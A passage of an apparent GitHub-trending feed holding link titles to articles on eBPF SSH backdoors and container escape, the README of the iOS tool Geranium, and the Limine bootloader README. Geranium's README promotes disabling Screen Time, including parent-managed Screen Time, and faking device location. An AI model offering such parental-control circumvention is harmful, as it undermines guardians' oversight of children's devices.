href=&#34;https://xz.aliyun.com/t/10564?time__1311=mq+xBDyGDQG%3DKGKDsdohx5%3DGQGOQDcincoD&amp;amp;alichlgref=https://www.google.com/&#34;&gt;基于eBPF的SSH后门 - 先知社区&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://drivertom.blogspot.com/2022/01/ebpfdocker.html&#34;&gt;复现基于eBPF实现的Docker逃逸&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://mp.weixin.qq.com/s/Psqy3X3VdUPga7f2cnct1g&#34;&gt;云原生安全攻防｜使用eBPF逃逸容器技术分析与实践&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>c22dev/Geranium</title>
    <updated>2024-01-17T01:30:19Z</updated>
    <id>tag:github.com,2024-01-17:/c22dev/Geranium</id>
    <link href="https://github.com/c22dev/Geranium" rel="alternate"></link>
    <summary type="html">&lt;p&gt;LocSim, Daemon Manager, Cleaner and Superviser for TrollStore&lt;/p&gt;&lt;hr&gt;&lt;center&gt; &#xA; &lt;div align=&#34;center&#34;&gt; &#xA;  &lt;p&gt; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/0feaa3eb-2c27-4cc0-9fa8-704db9f0a40f&#34; width=&#34;100px&#34;&gt; &lt;/p&gt; &#xA;  &lt;h1&gt; Geranium &lt;/h1&gt; &#xA;  &lt;p&gt;LocSim, Daemon Manager, Cleaner and Superviser for TrollStore&lt;/p&gt; &#xA;  &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/ea95158f-1101-496b-b868-c3901db97543&#34; width=&#34;150px&#34;&gt; &#xA; &lt;/div&gt; &#xA; &lt;h6 align=&#34;center&#34;&gt; by c22dev &lt;/h6&gt; &#xA; &lt;h2&gt;Installation&lt;/h2&gt; &#xA; &lt;p&gt;To install Geranium, you must have &lt;a href=&#34;https://github.com/opa334/TrollStore&#34;&gt;TrollStore&lt;/a&gt; 1.3 or later, and a device on iOS 15 or later (if TrollStore supports it). Download the latest release from the release tab, and open it in TrollStore. Then, follow the setup process ! If you are on TrollStore 2.0.9, please update to latest version from TrollStore app, otherwise this app won&#39;t work.&lt;/p&gt; &#xA; &lt;h2&gt;Features&lt;/h2&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Simulate fake locations + bookmarks&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/a42ace92-028f-482f-9a66-6c4295a7fcba&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/c45d3553-1c5b-418b-b836-69d47330d489&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/bcd7f1bf-e684-4eee-964e-449aeae7f5fa&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/35a8c0c9-50cd-484b-bfd4-0290c0c50714&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/557b7da6-a181-4b2f-80a1-3e84f79b144f&#34; width=&#34;150px&#34;&gt; &#xA; &lt;p&gt;You can also import your old bookmarks from Mika&#39;s LocSim (by going into bookmarks tab), and save new bookmarks from Apple Maps !&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Clean your iDevice like never before&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/dc1d1818-8248-4c7a-95d7-615b00f280a4&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/a187c43b-38fd-4a91-a7b2-194de9bab67a&#34; width=&#34;150px&#34;&gt; &#xA; &lt;p&gt;Tired of the &#34;Other&#34; category taking up all of your space on your iDevice, well, you found the solution ! Some users have cleaned more than 16Gb of storage with this tool ! Please note that those screenshots aren&#39;t accurate because they were took on a simulator that didn&#39;t have the cleaned directories. Calculated sizes aren&#39;t always accurate.&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Manage daemons&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/977b1592-be87-42b1-84ad-5a9f6408279c&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/6ad3858d-36fc-415d-bae7-8624e19d178d&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/fd79e6cf-cc8b-44bc-8b7b-d88c2718d775&#34; width=&#34;150px&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/408fcfcb-8abd-4d1c-bedc-01e1a8051127&#34; width=&#34;150px&#34;&gt; &#xA; &lt;p&gt;Not using HomeKit and other Apple stuff, and want to optimize your phone performances to the best ? Here you can choose what you want to use !&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Disable ScreenTime&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/c0795578-1a87-45e5-a914-1200249ec705&#34; width=&#34;150px&#34;&gt; &#xA; &lt;p&gt;Forgot your screentime password ? Here you can say goodbye to Screen Time on your iOS device ! It also works with iCloud ScreenTimes. Disclaimer : don&#39;t use this if your parents manage your Screen Time, if you get caught it would probably make it worse for you. I am not responsible in case you get told off.&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;strong&gt;Supervise your device&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;img src=&#34;https://github.com/c22dev/Geranium/assets/102235607/415e4de8-b701-4046-914f-38c44671f8da&#34; width=&#34;150px&#34;&gt; &#xA; &lt;p&gt;Want to supervise your device with a custom organization name but don&#39;t have a computer, here you are ! We also have a great collection of supervised profiles.&lt;/p&gt; &#xA; &lt;h2&gt;Credits&lt;/h2&gt; &#xA; &lt;h3&gt;Code-wise&lt;/h3&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/bomberfish&#34;&gt;BomberFish&lt;/a&gt; &amp;amp; &lt;a href=&#34;https://github.com/donato-fiore&#34;&gt;Fiore&lt;/a&gt; for their amazing work in daemon listing - And thanks bomberfish for those amazing memes&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/sourcelocation&#34;&gt;sourcelocation&lt;/a&gt; for his beautiful SwiftUI extensions and functions, helped me a lot ! - My source of information in icon and video editing !&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://github.com/haxi0&#34;&gt;haxi0&lt;/a&gt; for his Welcome Page code, copied the part for the disabling. - Always funny&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA; &lt;h3&gt;Translators&lt;/h3&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/CySxL&#34;&gt;CySxL&lt;/a&gt; - 🇹🇼 Chinese (Traditional) - Here from the beginning, even if on iOS 14, thanks !&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/Defflix19&#34;&gt;Defflix&lt;/a&gt; - 🇨🇿/🇸🇰 Czech &amp;amp; Slovak - But also one of my greatest friend in the jailbreak community :)&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/Missauios&#34;&gt;iammissa235&lt;/a&gt; - 🇪🇸 Spanish (Latin America) - Also bug hunter&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/leonardoizzo_&#34;&gt;LeonardoIz&lt;/a&gt; - 🇪🇸 Spanish / 🇮🇹 Italian / Catalan - Casually speak 3 languages&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/loy64_&#34;&gt;Loy64&lt;/a&gt; - 🇦🇱 Albanian / 🇮🇹 Italian - Answers faster than light&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/dobabaophuc&#34;&gt;Phuc Do&lt;/a&gt; - 🇻🇳 Vietnamese - But also an amazing icon designer !&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/speedyfriend67&#34;&gt;Speedyfriend67&lt;/a&gt; - 🇰🇷 Korean - Actually speedrunned the translation&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/spy_g_&#34;&gt;Spy_G&lt;/a&gt; - 🇸🇪 Swedish - Funny nickname&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/straight_tamago&#34;&gt;Straight Tamago&lt;/a&gt; - 🇯🇵 Japenese - Lovely friend that always helps in code !&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/Ting2021&#34;&gt;ting0441&lt;/a&gt; - 🇨🇳 Chinese (Simplified) - UI Bug Reporter&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/ChromiumCandy&#34;&gt;ur.za&lt;/a&gt; - 🇯🇵 Japenese - Helped for cleaning terms&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/Alz971&#34;&gt;W$D$B&lt;/a&gt; - 🇮🇹 Italian - First to accomplish 100% in translation&lt;/li&gt; &#xA;  &lt;li&gt;&lt;a href=&#34;https://twitter.com/yyyyyy_public&#34;&gt;yyyywaiwai&lt;/a&gt; - 🇯🇵 Japenese - Reviewer but also filled the gaps !&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/center&gt;</summary>
  </entry>
  <entry>
    <title>limine-bootloader/limine</title>
    <updated>2024-01-17T01:30:19Z</updated>
    <id>tag:github.com,2024-01-17:/limine-bootloader/limine</id>
    <link href="https://github.com/limine-bootloader/limine" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Modern, advanced, portable, multiprotocol bootloader.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Limine&lt;/h1&gt; &#xA;&lt;h3&gt;What is Limine?&lt;/h3&gt; &#xA;&lt;p&gt;Limine (pronounced as shown &lt;a href=&#34;https://www.merriam-webster.com/dictionary/in%20limine&#34;&gt;here&lt;/a&gt;) is a modern, advanced, portable, multiprotocol bootloader, also used as the reference implementation for the &lt;a href=&#34;https://raw.githubusercontent.com/limine-bootloader/limine/stable/PROTOCOL.md&#34;&gt;Limine boot protocol&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Donate&lt;/h3&gt; &#xA;&lt;p&gt;If you want to support the work I (@mintsuki) do on Limine, feel free to donate to me on Liberapay: &lt;a href=&#34;https://liberapay.com/mintsuki/donate&#34;&gt;&lt;img alt=&#34;Donate using Liberapay&#34; src=&#34;https://liberapay.com/assets/widgets/donate.svg?sanitize=true&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Donations welcome, but absolutely not mandatory!&lt;/p&gt; &#xA;&lt;h3&gt;Limine&#39;s boot menu&lt;/h3&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/limine-bootloader/limine/stable/screenshot.png?raw=true&#34; alt=&#34;Reference screenshot&#34; title=&#34;Reference screenshot&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.pexels.com/photo/painting-of-black-cloud-during-sunset-164175/&#34;&gt;Photo by Pixabay&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Supported architectures&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;IA-32 (32-bit x86)&lt;/li&gt; &#xA; &lt;li&gt;x86-64&lt;/li&gt; &#xA; &lt;li&gt;aarch64 (arm64)&lt;/li&gt; &#xA; &lt;li&gt;riscv64&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Supported boot protocols&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Linux&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/limine-bootloader/limine/stable/PROTOCOL.md&#34;&gt;Limine&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Multiboot 1&lt;/li&gt; &#xA; &lt;li&gt;Multiboot 2&lt;/li&gt; &#xA; &lt;li&gt;Chainloading&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Supported partitioning schemes&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;MBR&lt;/li&gt; &#xA; &lt;li&gt;GPT&lt;/li&gt; &#xA; &lt;li&gt;Unpartitioned media&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Supported filesystems&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;FAT12/16/32&lt;/li&gt; &#xA; &lt;li&gt;ISO9660 (CDs/DVDs)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If your filesystem isn&#39;t listed here, please read &lt;a href=&#34;https://raw.githubusercontent.com/limine-bootloader/limine/stable/PHILOSOPHY.md&#34;&gt;the philosophy&lt;/a&gt; first, especially before opening issues or pull requests related to this.&lt;/p&gt; &#xA;&lt;h3&gt;Minimum system requirements&lt;/h3&gt; &#xA;&lt;p&gt;For 32-bit x86 systems, support is only ensured starting with those with Pentium Pro (i686) class CPUs.&lt;/p&gt; &#xA;&lt;p&gt;All x86-64, aarch64, and riscv64 (UEFI) systems are supported.&lt;/p&gt; &#xA;&lt;h2&gt;Packaging status&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://repology.org/project/limine/versions&#34;&gt;&lt;img src=&#34;https://repology.org/badge/vertical-allrepos/limine.svg?sanitize=true&#34; alt=&#34;Packaging status&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Binary releases&lt;/h2&gt; &#xA;&lt;p&gt;For convenience, for point releases, binaries are distributed. These binaries are shipped in the &lt;code&gt;-binary&lt;/code&gt; branches and tags of this repository (see &lt;a href=&#34;https://github.com/limine-bootloader/limine/branches/all&#34;&gt;branches&lt;/a&gt; and &lt;a href=&#34;https://github.com/limine-bootloader/limine/tags&#34;&gt;tags&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;For example, to clone the latest binary release, one can do:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/limine-bootloader/limine.git --branch=binary --depth=1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or, to clone a specific binary point release (for example &lt;code&gt;7.0.0&lt;/code&gt;):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/limine-bootloader/limine.git --branch=v7.0.0-binary --depth=1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In order to rebuild host utilities like &lt;code&gt;limine&lt;/code&gt;, simply run &lt;code&gt;make&lt;/code&gt; in the binary release directory.&lt;/p&gt; &#xA;&lt;p&gt;Host utility binaries are provided for Windows.&lt;/p&gt; &#xA;&lt;h2&gt;Building the bootloader&lt;/h2&gt; &#xA;&lt;p&gt;&lt;em&gt;The following steps are not necessary if cloning a binary release. If so, skip to&lt;/em&gt; &lt;em&gt;&#34;Installing Limine binaries&#34;.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Prerequisites&lt;/h3&gt; &#xA;&lt;p&gt;In order to build Limine, the following programs have to be installed: common UNIX tools (also known as &lt;code&gt;coreutils&lt;/code&gt;), &lt;code&gt;GNU make&lt;/code&gt;, &lt;code&gt;grep&lt;/code&gt;, &lt;code&gt;sed&lt;/code&gt;, &lt;code&gt;find&lt;/code&gt;, &lt;code&gt;awk&lt;/code&gt;, &lt;code&gt;gzip&lt;/code&gt;, &lt;code&gt;nasm&lt;/code&gt;, &lt;code&gt;mtools&lt;/code&gt; (optional, necessary to build &lt;code&gt;limine-uefi-cd.bin&lt;/code&gt;). Furthermore, &lt;code&gt;gcc&lt;/code&gt; or &lt;code&gt;llvm/clang&lt;/code&gt; must also be installed, alongside the respective binutils.&lt;/p&gt; &#xA;&lt;h3&gt;Configure&lt;/h3&gt; &#xA;&lt;p&gt;If using a release tarball (recommended, see &lt;a href=&#34;https://github.com/limine-bootloader/limine/releases&#34;&gt;https://github.com/limine-bootloader/limine/releases&lt;/a&gt;), run &lt;code&gt;./configure&lt;/code&gt; directly.&lt;/p&gt; &#xA;&lt;p&gt;If checking out from the repository, run &lt;code&gt;./bootstrap&lt;/code&gt; first in order to download the necessary dependencies and generate the configure script (&lt;code&gt;GNU autoconf&lt;/code&gt; required).&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;./configure&lt;/code&gt; takes arguments and environment variables; for more information on these, run &lt;code&gt;./configure --help&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;&lt;code&gt;./configure&lt;/code&gt; by default does not build any Limine port. Make sure to read the&lt;/strong&gt; &lt;strong&gt;output of &lt;code&gt;./configure --help&lt;/code&gt; and enable any or all ports!&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Limine supports both in-tree and out-of-tree builds. Simply run the &lt;code&gt;configure&lt;/code&gt; script from the directory you wish to execute the build in. The following &lt;code&gt;make&lt;/code&gt; commands are supposed to be run inside the build directory.&lt;/p&gt; &#xA;&lt;h3&gt;Building Limine&lt;/h3&gt; &#xA;&lt;p&gt;To build Limine, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make    # (or gmake where applicable)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The generated bootloader files are going to be in &lt;code&gt;./bin&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installing Limine binaries&lt;/h2&gt; &#xA;&lt;p&gt;This step is optional as the bootloader binaries can be used from the &lt;code&gt;./bin&lt;/code&gt; or release directory just fine. This step will only install them to &lt;code&gt;share&lt;/code&gt;, &lt;code&gt;include&lt;/code&gt;, and &lt;code&gt;bin&lt;/code&gt; directories in the specified prefix (default is &lt;code&gt;/usr/local&lt;/code&gt;, see &lt;code&gt;./configure --help&lt;/code&gt;, or the &lt;code&gt;PREFIX&lt;/code&gt; variable if installing from a binary release).&lt;/p&gt; &#xA;&lt;p&gt;To install Limine, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;make install    # (or gmake where applicable)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;How to use&lt;/h2&gt; &#xA;&lt;h3&gt;UEFI&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;BOOT*.EFI&lt;/code&gt; files are valid EFI applications that can be simply copied to the &lt;code&gt;/EFI/BOOT&lt;/code&gt; directory of a FAT formatted EFI system partition. These files can be installed there and coexist with a BIOS installation of Limine (see below) so that the disk will be bootable on both BIOS and UEFI systems.&lt;/p&gt; &#xA;&lt;p&gt;The boot device must contain the &lt;code&gt;limine.cfg&lt;/code&gt; files in either the root, &lt;code&gt;limine&lt;/code&gt;, &lt;code&gt;boot&lt;/code&gt;, or &lt;code&gt;boot/limine&lt;/code&gt; directory of one of the partitions, formatted with a supported file system (the ESP partition is recommended).&lt;/p&gt; &#xA;&lt;h3&gt;Secure Boot&lt;/h3&gt; &#xA;&lt;p&gt;Limine can be booted with secure boot if the executable is signed and the key used to sign it is added to the firmware&#39;s keychain. This should be done in combination with enrolling the BLAKE2B hash of the Limine config file into the Limine EFI executable image itself for verification purposes. For more information see the &lt;code&gt;limine enroll-config&lt;/code&gt; program and &lt;a href=&#34;https://raw.githubusercontent.com/limine-bootloader/limine/stable/PHILOSOPHY.md&#34;&gt;the philosophy&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;BIOS/MBR&lt;/h3&gt; &#xA;&lt;p&gt;In order to install Limine on a MBR device (which can just be a raw image file), run &lt;code&gt;limine bios-install&lt;/code&gt; as such:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;limine bios-install &amp;lt;path to device/image&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The boot device must contain the &lt;code&gt;limine-bios.sys&lt;/code&gt; and &lt;code&gt;limine.cfg&lt;/code&gt; files in either the root, &lt;code&gt;limine&lt;/code&gt;, &lt;code&gt;boot&lt;/code&gt;, or &lt;code&gt;boot/limine&lt;/code&gt; directory of one of the partitions, formatted with a supported file system.&lt;/p&gt; &#xA;&lt;h3&gt;BIOS/GPT&lt;/h3&gt; &#xA;&lt;p&gt;If using a GPT formatted device, there are 2 options one can follow for installation:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Specifying a dedicated stage 2 partition.&lt;/li&gt; &#xA; &lt;li&gt;Letting &lt;code&gt;limine bios-install&lt;/code&gt; attempt to embed stage 2 within GPT structures.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;In case one wants to specify a stage 2 partition, create a partition on the GPT device of at least 32KiB in size, and pass the 1-based number of the partition to &lt;code&gt;limine bios-install&lt;/code&gt; as a second argument; such as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;limine bios-install &amp;lt;path to device/image&amp;gt; &amp;lt;1-based stage 2 partition number&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In case one wants to let &lt;code&gt;limine bios-install&lt;/code&gt; embed stage 2 within GPT&#39;s structures, simply omit the partition number, and invoke &lt;code&gt;limine bios-install&lt;/code&gt; the same as one would do for an MBR partitioned device.&lt;/p&gt; &#xA;&lt;p&gt;The boot device must contain the &lt;code&gt;limine-bios.sys&lt;/code&gt; and &lt;code&gt;limine.cfg&lt;/code&gt; files in either the root, &lt;code&gt;limine&lt;/code&gt;, &lt;code&gt;boot&lt;/code&gt;, or &lt;code&gt;boot/limine&lt;/code&gt; directory of one of the partitions, formatted with a supported file system.&lt;/p&gt; &#xA;&lt;h3&gt;BIOS/UEFI hybrid ISO creation&lt;/h3&gt; &#xA;&lt;p&gt;In order to create a hybrid ISO with Limine, place the &lt;code&gt;limine-uefi-cd.bin&lt;/code&gt;, &lt;code&gt;limine-bios-cd.bin&lt;/code&gt;, &lt;code&gt;limine-bios.sys&lt;/code&gt;, and &lt;code&gt;limine.cfg&lt;/code&gt; files into a directory which will serve as the root of the created ISO. (&lt;code&gt;limine-bios.sys&lt;/code&gt; and &lt;code&gt;limine.cfg&lt;/code&gt; must either be in the root, &lt;code&gt;limine&lt;/code&gt;, &lt;code&gt;boot&lt;/code&gt;, or &lt;code&gt;boot/limine&lt;/code&gt; directory; &lt;code&gt;limine-uefi-cd.bin&lt;/code&gt; and &lt;code&gt;limine-bios-cd.bin&lt;/code&gt; can reside anywhere).&lt;/p&gt; &#xA;&lt;p&gt;After that, create a &lt;code&gt;&amp;lt;ISO root directory&amp;gt;/EFI/BOOT&lt;/code&gt; directory and copy the relevant Limine EFI executables over (such as &lt;code&gt;BOOTX64.EFI&lt;/code&gt;).&lt;/p&gt; &#xA;&lt;p&gt;Place any other file you want to be on the final ISO in said directory, then run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;xorriso -as mkisofs -b &amp;lt;relative path of limine-bios-cd.bin&amp;gt; \&#xA;        -no-emul-boot -boot-load-size 4 -boot-info-table \&#xA;        --efi-boot &amp;lt;relative path of limine-uefi-cd.bin&amp;gt; \&#xA;        -efi-boot-part --efi-boot-image --protective-msdos-label \&#xA;        &amp;lt;root directory&amp;gt; -o image.iso&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;em&gt;Note: &lt;code&gt;xorriso&lt;/code&gt; is required.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;And do not forget to also run &lt;code&gt;limine bios-install&lt;/code&gt; on the generated image:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;limine bios-install image.iso&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;&amp;lt;relative path of limine-bios-cd.bin&amp;gt;&lt;/code&gt; is the relative path of &lt;code&gt;limine-bios-cd.bin&lt;/code&gt; inside the root directory. For example, if it was copied in &lt;code&gt;&amp;lt;root directory&amp;gt;/boot/limine-bios-cd.bin&lt;/code&gt;, it would be &lt;code&gt;boot/limine-bios-cd.bin&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;&amp;lt;relative path of limine-uefi-cd.bin&amp;gt;&lt;/code&gt; is the relative path of &lt;code&gt;limine-uefi-cd.bin&lt;/code&gt; inside the root directory. For example, if it was copied in &lt;code&gt;&amp;lt;root directory&amp;gt;/boot/limine-uefi-cd.bin&lt;/code&gt;, it would be &lt;code&gt;boot/limine-uefi-cd.bin&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;BIOS/PXE boot&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;limine-bios-pxe.bin&lt;/code&gt; binary is a valid PXE boot image. In order to boot Limine from PXE it is necessary to setup a DHCP server with support for PXE booting. This can either be accomplished using a single DHCP server or your existing DHCP server and a proxy DHCP server such as dnsmasq.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;limine.cfg&lt;/code&gt; and &lt;code&gt;limine-bios.sys&lt;/code&gt; are expected to be on the server used for boot.&lt;/p&gt; &#xA;&lt;h3&gt;UEFI/PXE boot&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;BOOT*.EFI&lt;/code&gt; files are compatible with UEFI PXE. The steps needed to boot Limine are the same as with BIOS PXE, except that the &lt;code&gt;limine-bios.sys&lt;/code&gt; file is not needed on the server.&lt;/p&gt; &#xA;&lt;h3&gt;Configuration&lt;/h3&gt; &#xA;&lt;p&gt;The &lt;code&gt;limine.cfg&lt;/code&gt; file contains Limine&#39;s configuration.&lt;/p&gt; &#xA;&lt;p&gt;An example &lt;code&gt;limine.cfg&lt;/code&gt; file can be found in &lt;a href=&#34;https://github.com/limine-bootloader/limine/raw/trunk/test/limine.cfg&#34;&gt;&lt;code&gt;test/limine.cfg&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;More info on the format of &lt;code&gt;limine.cfg&lt;/code&gt; can be found in &lt;a href=&#34;https://github.com/limine-bootloader/limine/raw/trunk/CONFIG.md&#34;&gt;&lt;code&gt;CONFIG.md&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgments&lt;/h2&gt; &#xA;&lt;p&gt;Limine uses a stripped-down version of &lt;a href=&#34;https://github.com/jibsen/tinf&#34;&gt;tinf&lt;/a&gt; for early GZIP decompression.&lt;/p&gt; &#xA;&lt;p&gt;Limine relies on &lt;a href=&#34;https://github.com/nothings/stb/raw/master/stb_image.h&#34;&gt;stb_image&lt;/a&gt; for runtime GZIP decompression and image loading.&lt;/p&gt; &#xA;&lt;h2&gt;Discord server&lt;/h2&gt; &#xA;&lt;p&gt;We have a &lt;a href=&#34;https://discord.gg/QEeZMz4&#34;&gt;Discord server&lt;/a&gt; if you need support, info, or you just want to hang out with us.&lt;/p&gt;</summary>
  </entry>
</feed>